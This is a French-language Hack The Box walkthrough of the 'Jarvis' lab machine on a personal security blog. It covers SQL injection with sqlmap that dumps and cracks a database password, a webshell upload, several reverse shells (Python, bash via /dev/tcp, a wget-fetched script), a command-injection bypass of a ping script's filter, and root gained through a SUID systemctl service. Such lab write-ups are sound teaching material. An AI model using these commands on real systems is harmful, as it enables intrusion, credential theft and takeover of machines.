<!DOCTYPE html>
<html lang="">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.55.6" />

    
    
    

<title>Hack The Box - Jarvis • Haax - Personal Blog</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box - Jarvis"/>
<meta name="twitter:description" content="[NO ENGLISH VERSION - Only French is available for this post]

Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploitation d&rsquo;un injection SQL sur le site web permet de récupérer un accès limité. Une première phase d&rsquo;escalade de privilège est réalisée grâce à une injection de commande dans un script. Enfin, la compromission de la machine peut être faite grâce à un binaire SUID (systemctl) en construisant un service."/>

<meta property="og:title" content="Hack The Box - Jarvis" />
<meta property="og:description" content="[NO ENGLISH VERSION - Only French is available for this post]

Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploitation d&rsquo;un injection SQL sur le site web permet de récupérer un accès limité. Une première phase d&rsquo;escalade de privilège est réalisée grâce à une injection de commande dans un script. Enfin, la compromission de la machine peut être faite grâce à un binaire SUID (systemctl) en construisant un service." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://haaxmax.github.io/en/walkthroughs/hackthebox/jarvis/" />
<meta property="article:published_time" content="2019-11-09T00:00:00&#43;00:00"/>
<meta property="article:modified_time" content="2019-11-09T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    

</head>


    <body >
        
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      
      
          <a href="https://haaxmax.github.io/en">
          
          
          
          <div class="author-image">
            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
        
      <p class="site__description">
        <a href="https://haaxmax.github.io">
         Infosec articles &amp; CTF Writeups 
      </a>
      </p>
    </div>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/en/articles/">
						<span>Articles</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/walkthroughs/">
						<span>Walkthroughs</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/writeups/">
						<span>Write-Ups</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/en/about/">
						<span>About</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://github.com/Haaxmax" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
  
	
	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
	
	
	
	&nbsp;<a href="https://haaxmax.github.io/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
	</section>

    </p>
    <div class="langSection">
      
      
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/jarvis/" hreflang="fr" lang="fr" class="langLink">Français</a>
      <a rel="alternate" href="/fr/walkthroughs/hackthebox/jarvis/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
      </div>
    <p class="copyright">
      &copy; 2020 Haax.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
  <div>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Hack The Box - Jarvis</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Nov 9, 2019
    
    
    
    
    <br/>
    <i class="fas fa-clock"></i> 11 min read
</div>


  </header>
  <div class="post">
    <p>[NO ENGLISH VERSION - Only French is available for this post]</p>

<p>Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploitation d&rsquo;un injection SQL sur le site web permet de récupérer un accès limité. Une première phase d&rsquo;escalade de privilège est réalisée grâce à une injection de commande dans un script. Enfin, la compromission de la machine peut être faite grâce à un binaire SUID (systemctl) en construisant un service.</p>

<p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>

<h2 id="découverte">Découverte</h2>

<p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>

<pre><code>$ nmap -T4 -sS -Pn -p- -oN nmap_all_ports.txt -v 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.022s latency).
Not shown: 65529 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
5355/tcp  filtered llmnr
9911/tcp  open     sype-transport
33333/tcp open     dgi-serv
64999/tcp open     unknown
</code></pre>

<pre><code>$ nmap -T4 -sS -Pn -p 22,80,9911,33333,64999 -O -sV -oN nmap_specific.txt -v 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.020s latency).

PORT      STATE SERVICE         VERSION
22/tcp    open  ssh             OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http            Apache httpd 2.4.25 ((Debian))
9911/tcp  open  sype-transport?
33333/tcp open  dgi-serv?
64999/tcp open  http            Apache httpd 2.4.25 ((Debian))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33333-TCP:V=7.80%I=7%D=9/2%Time=5D6CDA02%P=x86_64-pc-linux-gnu%r(NU
SF:LL,33,&quot;sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned
SF:\x20off\r\n\$\x20&quot;)%r(GenericLines,43,&quot;sh:\x200:\x20can't\x20access\x20
SF:tty;\x20job\x20control\x20turned\x20off\r\n\$\x20\r\n\r\n\r\n\r\n\$\x20
SF:\$\x20\$\x20\$\x20&quot;)%r(GetRequest,68,&quot;GET\x20/\x20HTTP/1\.0\r\n\r\n\r\n
SF:\r\nsh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x2
SF:0off\r\n\$\x20sh:\x201:\x20GET:\x20not\x20found\r\n\$\x20\$\x20\$\x20\$
SF:\x20&quot;)%r(HTTPOptions,70,&quot;OPTIONS\x20/\x20HTTP/1\.0\r\n\r\n\r\n\r\nsh:\x
SF:200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off\r\n\
SF:$\x20sh:\x201:\x20OPTIONS:\x20not\x20found\r\n\$\x20\$\x20\$\x20\$\x20&quot;
SF:)%r(RTSPRequest,70,&quot;OPTIONS\x20/\x20RTSP/1\.0\r\n\r\n\r\n\r\nsh:\x200:\
SF:x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off\r\n\$\x20
SF:sh:\x201:\x20OPTIONS:\x20not\x20found\r\n\$\x20\$\x20\$\x20\$\x20&quot;)%r(D
SF:NSVersionBindReqTCP,35,&quot;\^Csh:\x200:\x20can't\x20access\x20tty;\x20job\
SF:x20control\x20turned\x20off\r\n\$\x20&quot;)%r(DNSStatusRequestTCP,4F,&quot;\^@\^
SF:L\^@\^@\^P\^@\^@\^@\^@\^@\^@\^@\^@\^@sh:\x200:\x20can't\x20access\x20tt
SF:y;\x20job\x20control\x20turned\x20off\r\n\$\x20&quot;)%r(Help,57,&quot;HELP\r\n\r
SF:\nsh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20o
SF:ff\r\n\$\x20sh:\x201:\x20HELP:\x20not\x20found\r\n\$\x20\$\x20&quot;)%r(SSLS
SF:essionReq,39,&quot;\^C\^A\^@sh:\x200:\x20can't\x20access\x20tty;\x20job\x20c
SF:ontrol\x20turned\x20off\r\n\$\x20&quot;)%r(TerminalServerCookie,3B,&quot;\^C\^@\^
SF:@\^@sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x2
SF:0off\r\n\$\x20&quot;)%r(TLSSessionReq,39,&quot;\^C\^E\^Bsh:\x200:\x20can't\x20acc
SF:ess\x20tty;\x20job\x20control\x20turned\x20off\r\n\$\x20&quot;)%r(Kerberos,3
SF:B,&quot;\^C\^B\^A\^Bsh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x
SF:20turned\x20off\r\n\$\x20&quot;)%r(SMBProgNeg,109,&quot;\^@\^@\^@\xa4\xffSMBr\^@\
SF:^@\^@\^@\^H\^A@\^@\^@\^@\^@\^@\^@\^@\^@\^@\^@\^@\^@\^@\^@@\^F\^@\^@\^A\
SF:^@\^@\x81\^@\^BPC\x20NETWORK\x20PROGRAM\x201\.0\^@\^BMICROSOFT\x20NETWO
SF:RKS\x201\.03\^@\^BMICROSOFT\x20NETWORKS\x203\.0\^@\^BLANMAN1\.0\^@\^BLM
SF:1\.2X002\^@\^BSamba\^@\^BNT\x20LANMAN\x201\.0\^@\^BNT\x20LM\x200\.12\^@
SF:sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off
SF:\r\n\$\x20&quot;);
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%), Linux 3.18 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.495 days (since Sun Sep  1 23:09:57 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code></pre>

<h2 id="injection-sql">Injection SQL</h2>

<p>Le port 80 étant ouvert, les recherches commencent par ici. Il s&rsquo;agit du site web d&rsquo;un hôtel, utilisé pour présenter ce dernier et réserver des chambres. Un rapide parcourt du site permet de remarquer une URL intéressante :</p>

<pre><code>http://10.10.10.143/room.php?cod=1
</code></pre>

<p>On pense directement à une injection SQL.
Quelques tests basiques à base de &ldquo;simples quotes&rdquo; permettent de mettre en évidence la présence de la vulnérabilité.</p>

<p>A ce moment là, deux possibilités. Exploitation à la main ou automatisée. Dans le cadre de cette machine, j&rsquo;ai préféré automatiser l&rsquo;exploitation, à l&rsquo;aide de <code>sqlmap</code>.</p>

<pre><code class="language-bash">$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot;
$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; --dbs
$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; -D mysql --tables
$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; -D mysql -T user --dump
</code></pre>

<p>Les commandes ci-dessus permettent de parcourir les différentes bases de données et leurs tables. On récupère ainsi l&rsquo;utilisateur <code>DBadmin</code> ainsi que son hash. Sqlmap propose également de tenter de casser ce hash à l&rsquo;aide de wordlists. Dans le cas de Jarvis, le mot de passe de l&rsquo;utilisateur est relativement faible.</p>

<pre><code class="language-bash">User : DBadmin
Password : imissyou
</code></pre>

<p>A partir de là, plusieurs choses possibles (j&rsquo;ai appris plus tard qu&rsquo;un PHPMyAdmin vulnérable était présent). J&rsquo;ai personnellement choisi d&rsquo;uploader directement un webshell sur la machine, à l&rsquo;aide de sqlmap également (PHP webshell).</p>

<pre><code>$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; --os-shell
        ___
       __H__
 ___ ___[&quot;]_____ ___ ___  {1.3.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[...]

[14:00:57] [INFO] retrieved web server absolute paths: '/images/'
[14:00:57] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[14:00:57] [WARNING] unable to upload the file stager on '/var/www/'
[14:00:57] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[14:00:57] [WARNING] expect junk characters inside the file as a leftover from UNION query
[14:00:57] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[14:00:57] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[14:00:57] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpuldjj.php
[14:00:58] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpbivlw.php
[14:00:58] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell&gt; whoami
do you want to retrieve the command standard output? [Y/n/a] command standard output: 'www-data'
</code></pre>

<h2 id="énumération-locale">Énumération locale</h2>

<p>Afin de récupérer un accès plus stable et confortable, on peut exécuter un revershe shell en python.</p>

<pre><code>os-shell&gt; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ATTACKER-IP&gt;&quot;,2233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>

<pre><code>$ nc -lvvp 2233
listening on [any] 2233 ...
10.10.10.143: inverse host lookup failed: Unknown host
connect to [10.10.13.221] from (UNKNOWN) [10.10.10.143] 34156
/bin/sh: 0: can't access tty; job control turned off
$
</code></pre>

<p>Pour encore plus de confort, on pop un bash complet à l&rsquo;aide de python.</p>

<pre><code>$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
www-data@jarvis:/var/www/html$ 
</code></pre>

<p>Et une phase d&rsquo;énumération commence&hellip; On peut par exemple utiliser le très bon script LinEnum.sh (<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>) permettant d&rsquo;avoir une vue d&rsquo;ensemble mais assez précise de la machine et de trouver d&rsquo;éventuels points faibles.</p>

<p>Afin d&rsquo;illustrer la suite, voici le contenu du fichier <code>/etc/passwd</code>.</p>

<pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
</code></pre>

<h2 id="script-sudo-et-injection-de-commandes">Script sudo et injection de commandes</h2>

<p>Ci-dessous, un élément intéressant provenant de LinEnum.sh.</p>

<pre><code>[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: 
</code></pre>

<p>Il est donc possible d&rsquo;utiliser le script <code>/var/www/Admin-Utilities/simpler.py</code> avec sudo en temps que &ldquo;pepper&rdquo;.</p>

<pre><code>www-data@jarvis:/tmp$ file /var/www/Admin-Utilities/simpler.py
file /var/www/Admin-Utilities/simpler.py
/var/www/Admin-Utilities/simpler.py: Python script, ASCII text executable

www-data@jarvis:/tmp$ ls -la /var/www/Admin-Utilities/          
ls -la /var/www/Admin-Utilities/
total 16
drwxr-xr-x 2 pepper pepper 4096 Mar  4  2019 .
drwxr-xr-x 4 root   root   4096 Mar  4  2019 ..
-rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 simpler.py
</code></pre>

<p>Une rapide analyse du code source (disponible ci-dessous) révèle que l&rsquo;outil réalise entre autres un ping après que l&rsquo;utilisateur ait rentré une adresse IP à joindre.</p>

<pre><code class="language-python">#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha &gt; dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) &gt; int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
    
    print('Most Risky:')
    if len(ip_list) &gt; 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
    
    print('Most Recent: ' + ip2 + ' --&gt; ' + str(dat) + ' ' + req)
    
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha &gt; dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
            
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
    
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) &gt; int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
    
def exec_ping():
    forbidden = ['&amp;', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()

</code></pre>

<p>On a donc :</p>

<ul>
<li>Une exécution de commande ;</li>
<li>Lancée après un input utilisateur ;</li>
<li>Par un script qui peut être lancé avec sudo ;</li>
<li>Avec des droits utilisateurs (plus élevés), sans mot de passe.</li>
</ul>

<p>Mmh.. What could go wrong ? ¯\_(ツ)_/¯¯</p>

<p>On se rend rapidement compte qu&rsquo;un petit filtre est en place. Après quelques tentatives, un bypass, tout aussi simple est trouvé et permet d&rsquo;exécuter la commande que l&rsquo;on souhaite, en déclenchant une erreur dans la commande ping exécutée.</p>

<pre><code>$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(cat /etc/passwd)
$(cat /etc/passwd)

ping: sshd:x:107:65534::/run/sshd:/usr/sbin/nologin: Temporary failure in name resolution

</code></pre>

<p>Ainsi, on peut facilement construire un reverse shell, qui sera exécuté avec les droits de l&rsquo;utilisateur <code>pepper</code>.
Pour cette fois ci, plutôt que d&rsquo;exécuter directement une commande bash (notamment à cause des filtres) et puisque la machine dispose de l&rsquo;outil <code>wget</code>, j&rsquo;ai choisi d&rsquo;upload sur cette dernière un script bash exécutant mon reverse shell.</p>

<p>A noter qu&rsquo;il est nécessaire d&rsquo;upload et modifier le fichier avec l&rsquo;injection de commandes afin que ce dernier dispose des bons droits d&rsquo;exécution et puisse donner un shell avec le bon utilisateur.</p>

<pre><code class="language-bash">$ cat pwn.sh                
#!/bin/bash -p

bash -i &gt;&amp; /dev/tcp/10.10.13.221/4455 0&gt;&amp;1
</code></pre>

<pre><code>$(wget http://10.10.13.221:8000/pwn.sh)
$(chmod +x pwn.sh)
$(./pwn.sh)
</code></pre>

<pre><code>$ nc -lvvp 4455
listening on [any] 4455 ...
10.10.10.143: inverse host lookup failed: Unknown host
connect to [10.10.13.221] from (UNKNOWN) [10.10.10.143] 40742
pepper@jarvis:/var/www/html$ 
</code></pre>

<h2 id="escalade-de-privilèges-via-systemctl">Escalade de privilèges via systemctl</h2>

<p>Une seconde phase d&rsquo;énumération et de recherche permet d&rsquo;identifier, au travers de LinEnum encore une fois, un binaire intéressant.</p>

<pre><code>[-] SUID files:
-rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</code></pre>

<p>En effet, il est possible pour tout membre du groupe <code>pepper</code> de lancer systemctl&hellip; Intéressant et anormal !
Après quelques recherches, il s&rsquo;avère qu&rsquo;il semble possible de procéder à une escalade de privilège par ce biais (<a href="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a>).</p>

<p>Le binaire étant SUID, cela signifie que les services créés seront exécutés avec les droits root. On peut ainsi penser à créer nous même un service, suivant le lien ci-dessus, afin de récupérer un accès root à la machine.</p>

<p>Let&rsquo;s craft !</p>

<pre><code>echo '[Service]' &gt; /home/pepper/test.service
echo 'Type=oneshot' &gt;&gt; /home/pepper/test.service
echo 'ExecStart=/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.13.221/6677 0&gt;&amp;1&quot;' &gt;&gt; /home/pepper/test.service
echo '[Install]' &gt;&gt; /home/pepper/test.service
echo 'WantedBy=multi-user.target' &gt;&gt; /home/pepper/test.service
</code></pre>

<p>On va maintenant lier notre service à systemctl puis le démarrer. Ainsi l&rsquo;instruction <code>ExecStart</code> sera lancée au démarrage.</p>

<p>NOTE 1 : Il est à noter que l&rsquo;exploitation ne peut se faire dans /tmp, probablement à cause d&rsquo;une option <code>noexec</code>. Ainsi, il est nécessaire de déplacer le service dans <code>/home/pepper</code>.</p>

<p>NOTE 2 : Petit point qui m&rsquo;a fait tourner en rond, il est obligatoire de fournir le chemin absolu vers le service à systemctl&hellip; Pas de chemin relatif !</p>

<pre><code>pepper@jarvis:~$ /bin/systemctl link /home/pepper/test.service
/bin/systemctl link /home/pepper/test.service
Created symlink /etc/systemd/system/test.service -&gt; /home/pepper/test.service.

pepper@jarvis:~$ /bin/systemctl enable --now /home/pepper/test.service 
/bin/systemctl enable --now /home/pepper/test.service
Created symlink /etc/systemd/system/multi-user.target.wants/test.service -&gt; /home/pepper/test.service.
</code></pre>

<p>Le listener netcat en écoute, on récupère bien une connexion au lancement du service !</p>

<pre><code>$ nc -lvvp 6677
listening on [any] 6677 ...
10.10.10.143: inverse host lookup failed: Unknown host
connect to [10.10.13.221] from (UNKNOWN) [10.10.10.143] 56954
bash: cannot set terminal process group (3253): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/# id 
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<p>w00ted !</p>
  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/en/walkthroughs/hackthebox/haystack/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Hack The Box - Haystack</span>
    </a>
    
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-126182747-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
